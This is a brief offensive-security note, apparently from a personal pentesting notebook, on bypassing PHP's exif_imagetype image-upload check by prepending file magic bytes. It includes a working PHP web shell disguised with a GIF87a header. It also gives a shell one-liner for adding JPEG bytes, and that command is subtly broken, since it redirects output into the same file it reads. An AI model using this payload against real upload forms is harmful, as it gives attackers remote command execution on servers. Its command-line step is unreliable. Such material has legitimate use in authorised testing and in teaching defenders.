To bypass exif_imagetype function in PHP, you can append the appropriate ISO code to the beginning of the file.

This works as the exif_imagetype checks the magic header of the file instead of the extension.

You can confirm if the hexdump heading matches the given ISO code by using [[xxd]] in Linux

[List of all file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

> [!example]
> Here we are bypassing an image upload that expects JPEG file
> ```php
> GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
> ```

In this case, the bytes that make up the magic headers (`47 49 46 38 37 61`) are all in the ASCII-readable range. But what if we went with JPG and had to prepend the (ASCII-unreadable) characters `FF D8 FF EE`?

You have a few different options to do this:

- You can a hex editor like [Hex Fiend](https://hexfiend.com/?ref=learnhacking.io) (Mac) to add the additional bytes, by copy/pasting the bytes into the hex side of the editor.
- Or you can use the command line: `(echo -n -e '\xff\xd8\xff\xee'; cat shell.php) > shell.php`
- Or you can use [a script like this](https://github.com/AlessandraZullo/shellImage/blob/master/shellImage.py?ref=learnhacking.io).